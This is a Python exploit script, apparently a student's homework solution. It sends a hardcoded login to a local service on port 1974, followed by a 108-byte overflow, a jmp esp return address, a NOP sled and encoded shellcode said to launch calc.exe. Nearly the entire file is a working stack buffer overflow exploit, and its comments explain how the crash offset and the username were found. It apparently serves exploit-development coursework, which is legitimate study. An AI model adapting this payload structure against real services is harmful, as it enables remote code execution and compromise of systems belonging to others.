#!/usr/bin/python 
# Solution for Homeworkfall-2011-v2
# Took a while to figure out the username and password
# i used http://onlinedisassembler.com/odaweb/ to find out the username

import socket 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
user= "poly:teknik"
# crash occured at 108 byte
junk = '\x41'*108

#eip = '\x42'*4
# jmp esp at 7E429353
eip = '\x53\x93\x42\x7E'
 
nops = '\x90'*20
# shell space = 1880 bytes, runs calc.exe
shell=("\xd9\xc5\xd9\x74\x24\xf4\xbe\xc1\x9a\xec\x97\x5a\x29\xc9\xb1"
"\x33\x31\x72\x17\x03\x72\x17\x83\x2b\x66\x0e\x62\x57\x7f\x46"
"\x8d\xa7\x80\x39\x07\x42\xb1\x6b\x73\x07\xe0\xbb\xf7\x45\x09"
"\x37\x55\x7d\x9a\x35\x72\x72\x2b\xf3\xa4\xbd\xac\x35\x69\x11"
"\x6e\x57\x15\x6b\xa3\xb7\x24\xa4\xb6\xb6\x61\xd8\x39\xea\x3a"
"\x97\xe8\x1b\x4e\xe5\x30\x1d\x80\x62\x08\x65\xa5\xb4\xfd\xdf"
"\xa4\xe4\xae\x54\xee\x1c\xc4\x33\xcf\x1d\x09\x20\x33\x54\x26"
"\x93\xc7\x67\xee\xed\x28\x56\xce\xa2\x16\x57\xc3\xbb\x5f\x5f"
"\x3c\xce\xab\x9c\xc1\xc9\x6f\xdf\x1d\x5f\x72\x47\xd5\xc7\x56"
"\x76\x3a\x91\x1d\x74\xf7\xd5\x7a\x98\x06\x39\xf1\xa4\x83\xbc"
"\xd6\x2d\xd7\x9a\xf2\x76\x83\x83\xa3\xd2\x62\xbb\xb4\xba\xdb"
"\x19\xbe\x28\x0f\x1b\x9d\x26\xce\xa9\x9b\x0f\xd0\xb1\xa3\x3f"
"\xb9\x80\x28\xd0\xbe\x1c\xfb\x95\x31\x57\xa6\xbf\xd9\x3e\x32"
"\x82\x87\xc0\xe8\xc0\xb1\x42\x19\xb8\x45\x5a\x68\xbd\x02\xdc"
"\x80\xcf\x1b\x89\xa6\x7c\x1b\x98\xc4\xe3\x8f\x40\x25\x86\x37"
"\xe2\x39")
print "\nSending evil buffer..." 
s.connect(('127.0.0.1',1974)) 
data = s.recv(1024) 
s.send(user+' '+ junk + eip + nops + shell+'\r\n') 
data = s.recv(1024) 
print "\nDONE" 

s.close()